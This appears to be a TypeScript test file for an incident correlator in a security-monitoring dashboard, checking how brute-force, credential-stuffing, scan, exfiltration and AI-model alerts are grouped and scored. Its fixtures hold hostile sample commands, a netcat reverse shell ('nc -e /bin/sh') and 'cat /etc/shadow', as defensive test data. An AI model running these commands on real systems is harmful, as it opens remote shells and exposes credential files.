// Run with: npm test. Alerts and events shaped exactly like the backend's (api/app, processor/alerts.py).
import { test } from "node:test";
import assert from "node:assert/strict";
import { Correlator } from "../src/data/backend/correlate.ts";
import type { AlertRow, EnrichedEvent } from "../src/data/backend/types.ts";
import type { Incident } from "../src/data/types.ts";

const T0 = Date.parse("2026-10-06T10:00:00Z");
let n = 0;

function setup() {
  const live = new Map<string, Incident>();
  const removed: string[] = [];
  const expired: string[] = [];
  const c = new Correlator({
    upsert: (i) => live.set(i.id, i),
    remove: (id) => (removed.push(id), live.delete(id)),
    expire: (id) => (expired.push(id), live.delete(id)),
  });
  return { c, live, removed, expired };
}

function event(over: Partial<EnrichedEvent>, at = T0): EnrichedEvent {
  return { event_id: `e${++n}`, event_ts: new Date(at).toISOString(), user: "-", ip: "198.51.100.7", host: "web-01", ...over };
}

function alert(rule: string | null, ev: EnrichedEvent, at = T0, over: Partial<AlertRow> = {}): AlertRow {
  return {
    id: ++n,
    alert_id: `a${n}`,
    rule_id: rule,
    model: null,
    severity: "high",
    event_ids: [ev.event_id],
    status: "open",
    created_ts: new Date(at).toISOString(),
    ...over,
  };
}

/** Feed an event and the alert it raised, the way the live stream does. */
function hit(c: Correlator, rule: string | null, over: Partial<EnrichedEvent>, at = T0, row: Partial<AlertRow> = {}) {
  const ev = event(over, at);
  c.addEvents([ev], at);
  c.addAlert(alert(rule, ev, at, row), at);
  return ev;
}

test("a rule that keeps firing on one address is one incident, not one per alert", () => {
  const { c, live } = setup();
  for (let i = 0; i < 12; i++) {
    hit(c, "brute_force", { event_type: "login", status: "failure", user: "maria.silva" }, T0 + i * 1000);
  }
  assert.equal(live.size, 1);
  const inc = [...live.values()][0];
  assert.equal(inc.attackType, "brute_force");
  assert.equal(inc.signals.length, 1);
  assert.equal(inc.signals[0].ruleId, "BF");
  assert.match(inc.signals[0].sentence, /^12 failed logins for maria\.silva from 198\.51\.100\.7$/);
  assert.equal(inc.alerts, 12); // the backend alerts behind it: a repeated attack grows this, not the row count
  assert.equal(inc.severity, 4); // "high" from the backend
  assert.equal(inc.attentionScore, 40); // 20 points, +2 per repeat, capped at double
  assert.deepEqual(inc.fixes, []); // no CRIE: the fallback mitigations show instead
  assert.equal(inc.fallback?.technique, "T1110.001");
});

test("repeats never more than double a rule's points", () => {
  const { c, live } = setup();
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" });
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + 100);
  assert.equal([...live.values()][0].attentionScore, 22);
  for (let i = 0; i < 200; i++) hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + i * 100);
  assert.equal([...live.values()][0].attentionScore, 40);
});

test("failures across many accounts become one credential stuffing campaign", () => {
  const { c, live, removed } = setup();
  // First address: one account, so it starts as password guessing.
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "a.one", ip: "203.0.113.1", path: "/login" });
  assert.equal([...live.values()][0].attackType, "brute_force");
  // The same address then fails on two more accounts: it is stuffing, and keeps its number.
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "b.two", ip: "203.0.113.1", path: "/login" }, T0 + 1000);
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "c.three", ip: "203.0.113.1", path: "/login" }, T0 + 2000);
  assert.equal(live.size, 1);
  const campaign = [...live.values()][0];
  assert.equal(campaign.id, "0001");
  assert.equal(campaign.attackType, "credential_stuffing");
  // A second address guessing alone joins once it also spreads over accounts.
  hit(c, "brute_force", { event_type: "login", status: "failure", user: "d.four", ip: "203.0.113.2", path: "/login" }, T0 + 3000);
  assert.equal(live.size, 2);
  for (const u of ["e.five", "f.six"]) {
    hit(c, "brute_force", { event_type: "login", status: "failure", user: u, ip: "203.0.113.2", path: "/login" }, T0 + 4000);
  }
  assert.equal(live.size, 1);
  assert.deepEqual(removed, ["0002"]);
  const merged = live.get("0001")!;
  assert.deepEqual(merged.entities.ips.sort(), ["203.0.113.1", "203.0.113.2"]);
  assert.equal(merged.entities.users.length, 6);
  const spray = merged.signals.find((s) => s.ruleId === "SPRAY");
  assert.equal(spray?.sentence, "Failed logins on 6 different accounts from 2 addresses");
  assert.equal(merged.signals.find((s) => s.ruleId === "BF")?.sentence, "6 failed logins in 2 min, 5 or more a minute per address");
  // The campaign is stronger evidence than the one rule the backend has for it.
  assert.equal(merged.attentionScore, 20 + 10 + 30);
});

test("a login that works after the guessing means the account was taken over", () => {
  const { c, live } = setup();
  const login = { event_type: "login", user: "maria.silva", ip: "203.0.113.9" };
  for (let i = 0; i < 6; i++) hit(c, "brute_force", { ...login, status: "failure" }, T0 + i * 1000);
  c.addEvents([event({ ...login, status: "success" }, T0 + 7000)], T0 + 7000);
  const inc = [...live.values()][0];
  assert.equal(inc.name, "Brute force, account taken over");
  assert.equal(inc.severity, 5);
  assert.equal(inc.signals.at(-1)?.sentence, "maria.silva logged in from 203.0.113.9 after 6 failed attempts");
  // Someone else logging in from elsewhere changes nothing.
  c.addEvents([event({ event_type: "login", user: "j.okafor", ip: "198.51.100.3", status: "success" })], T0 + 8000);
  assert.equal([...live.values()][0].signals.length, 2);
});

test("a watch-listed address adds to its open incident and opens none on its own", () => {
  const { c, live } = setup();
  hit(c, "suspicious_ip", { ip: "203.0.113.10" });
  assert.equal(live.size, 0);
  hit(c, "web_scan", { ip: "203.0.113.10", event_type: "http_request", path: "/.git/config" });
  hit(c, "suspicious_ip", { ip: "203.0.113.10" });
  const inc = [...live.values()][0];
  assert.deepEqual(inc.signals.map((s) => s.ruleId), ["SCAN", "IOC"]);
  assert.equal(inc.attentionScore, 35);
});

test("the placeholder scorer is never shown as AI; a real model is", () => {
  const { c, live } = setup();
  hit(c, "data_exfiltration", { user: "admin2", bytes_out: 300_000_000, event_type: "data_transfer" }, T0, { severity: "critical" });
  hit(c, null, { user: "admin2", risk_score: 0.9 }, T0 + 1000, { model: "DummyScorer" });
  let inc = [...live.values()][0];
  assert.equal(inc.detectedBy, "rule");
  // The event's risk_score (0.9) is the placeholder's: only the model's own score is shown.
  hit(c, null, { user: "admin2", risk_score: 0.9 }, T0 + 2000, { model: "atde-1.0.0", class: "anomaly", risk_score: 0.81 });
  inc = [...live.values()][0];
  assert.equal(inc.detectedBy, "both");
  assert.equal(inc.signals[1].ruleId, "ATDE");
  assert.equal(inc.signals[1].sentence, "AI engine: unusual for this address, score 0.81");
  assert.equal(inc.severity, 5);
});

// ---------------------------------------------------------------- the AI engine (ATDE, model 1)

/** A model alert as ml-scorer sends it (contracts/LIVE_API.md 5.1): it carries its own source. */
function modelAlert(over: Partial<AlertRow>, at = T0): AlertRow {
  return alert(null, { event_id: `f${++n}`, event_ts: new Date(at).toISOString() }, at, {
    model: "atde-1.0.0",
    severity: "low",
    class: "anomaly",
    probability: null,
    anomaly_score: 0.74,
    risk_score: 0.74,
    reasons: [
      { feature: "nports_60s", value: 9, contribution: -0.3, sentence: "nports 60s = 9" },
      { feature: "cnt_60s", value: 42, contribution: -0.2, sentence: "cnt 60s = 42" },
      { feature: "bytes_per_packet", value: 40.5, contribution: -0.1, sentence: "bytes per packet = 40.5" },
    ],
    rule_flagged: false,
    ip: "10.0.4.17",
    user: "-",
    host: "10.0.9.2",
    ...over,
  });
}

test("a model alert on an event a rule flagged gives that incident the model's score and reasons", () => {
  const { c, live } = setup();
  const ev = hit(c, "web_scan", { ip: "203.0.113.50", event_type: "http_request", path: "/.env" });
  c.addAlert(modelAlert({ event_ids: [ev.event_id], ip: "203.0.113.50", host: "web-01", rule_flagged: true, risk_score: 0.81 }), T0 + 500);
  assert.equal(live.size, 1);
  const inc = [...live.values()][0];
  assert.equal(inc.detectedBy, "both");
  assert.deepEqual(inc.signals.map((s) => s.ruleId), ["SCAN", "ATDE"]);
  assert.equal(
    inc.signals[1].sentence,
    "AI engine: unusual for this address, score 0.81. Most unusual: 9 ports tried in 60 s, 42 connections in 60 s, 40.5 bytes per packet",
  );
});

test("a flagged event whose rule incident is gone adds nothing", () => {
  const { c, live } = setup();
  c.addAlert(modelAlert({ rule_flagged: true }), T0);
  assert.equal(live.size, 0);
});

test("a model alert with no rule hit that names no attack opens no incident", () => {
  const { c, live } = setup();
  c.addAlert(modelAlert({}), T0);
  assert.equal(live.size, 0);
});

test("a model alert that names a known attack opens that attack; other classes open nothing", () => {
  const { c, live } = setup();
  c.addAlert(modelAlert({ class: "Credential Attack / Brute Force", probability: 0.93, severity: "high", reasons: [] }), T0);
  const brute = [...live.values()][0];
  assert.equal(brute.attackType, "brute_force");
  assert.equal(brute.name, "Brute force");
  assert.equal(brute.signals[0].sentence, "AI engine: looks like Credential Attack / Brute Force (probability 0.93), score 0.74");

  c.addAlert(modelAlert({ class: "DoS / Flooding", probability: 0.95, ip: "10.0.4.99", reasons: [] }), T0);
  assert.equal(live.size, 1);
  assert.equal([...live.values()].some((i) => i.entities.ips.includes("10.0.4.99")), false);
});

test("a model alert from an address with an open rule incident joins it", () => {
  const { c, live } = setup();
  hit(c, "web_scan", { ip: "10.0.4.17", event_type: "http_request", path: "/admin" });
  c.addAlert(modelAlert({}), T0 + 1000);
  assert.equal(live.size, 1);
  assert.equal([...live.values()][0].detectedBy, "both");
});

test("the placeholder scorer never opens an AI-only incident", () => {
  const { c, live } = setup();
  c.addAlert(modelAlert({ model: "DummyScorer" }), T0);
  assert.equal(live.size, 0);
});

test("a rule alert whose event never came is grouped by the source the alert carries", () => {
  const { c, live } = setup();
  const ev = event({ ip: "192.0.2.77" }); // never sent
  c.addAlert(alert("web_scan", ev, T0, { ip: "192.0.2.77", host: "web-02" }), T0);
  c.tick(T0 + 3000);
  assert.deepEqual([...live.values()][0].entities.ips, ["192.0.2.77"]);
});

test("an alert that arrives before its event waits for it", () => {
  const { c, live } = setup();
  const ev = event({ ip: "192.0.2.9", event_type: "http_request", path: "/.env" });
  c.addAlert(alert("web_scan", ev), T0);
  assert.equal(live.size, 0);
  c.addEvents([ev], T0 + 300);
  assert.deepEqual([...live.values()][0].entities.ips, ["192.0.2.9"]);
});

test("an alert whose event never comes opens no incident, unless it needs no source", () => {
  const { c, live } = setup();
  c.addAlert(alert("web_scan", event({ ip: "192.0.2.10" })), T0); // which address? unknown
  c.tick(T0 + 1000);
  c.tick(T0 + 3000);
  assert.equal(live.size, 0);
  c.addAlert(alert("http_flood", event({}), T0, { severity: "critical" }), T0); // a flood is grouped by site
  c.tick(T0 + 6000);
  assert.equal([...live.values()][0]?.attackType, "http_flood");
});

test("the same alert twice counts once (a reconnect replays recent alerts)", () => {
  const { c, live } = setup();
  const ev = event({ event_type: "process_start", user: "admin1", process: "cat /etc/shadow" });
  c.addEvents([ev], T0);
  const row = alert("malicious_process", ev, T0, { severity: "critical" });
  c.addAlert(row, T0);
  c.addAlert(row, T0 + 5000);
  assert.equal([...live.values()][0].signals[0].sentence, "Suspicious command on web-01: cat /etc/shadow");
});

test("an incident expires when its window runs out, and the next alert opens a new one", () => {
  const { c, live, expired } = setup();
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" });
  c.tick(T0 + 14 * 60_000);
  assert.equal(live.size, 1);
  c.tick(T0 + 15 * 60_000); // web scan window: 15 minutes
  assert.deepEqual(expired, ["0001"]);
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + 16 * 60_000);
  assert.deepEqual([...live.keys()], ["0002"]);
});

test("an approved incident is decided: it never expires, and a continuing attack opens a new one", () => {
  const { c, live, expired } = setup();
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" });
  assert.deepEqual(c.rowsOf("0001").length, 1);
  c.close("0001");
  c.tick(T0 + 20 * 60_000);
  assert.deepEqual(expired, []);
  hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + 60_000);
  assert.ok(live.has("0002"));
});

test("an admin who ran suspicious commands and then moved data out is one incident", () => {
  const { c, live } = setup();
  hit(c, "malicious_process", { user: "admin1", event_type: "process_start", process: "nc -e /bin/sh 10.0.0.1 4444" }, T0, { severity: "critical" });
  hit(c, "data_exfiltration", { user: "admin1", bytes_out: 1_200_000_000, event_type: "data_transfer" }, T0 + 30_000, { severity: "critical" });
  assert.equal(live.size, 1);
  const inc = [...live.values()][0];
  assert.equal(inc.attackType, "admin_abuse");
  assert.equal(inc.signals[1].sentence, "admin1 sent 1.2 GB out in one transfer");
});

test("a failed admin login during a password attack belongs to that attack", () => {
  const { c, live } = setup();
  const login = { event_type: "login", status: "failure", user: "admin1", ip: "203.0.113.50", path: "/admin/login" };
  hit(c, "brute_force", login);
  hit(c, "suspicious_login", login, T0 + 100, { severity: "medium" });
  assert.equal(live.size, 1);
  assert.deepEqual([...live.values()][0].signals.map((s) => s.ruleId), ["BF", "ADM"]);
});
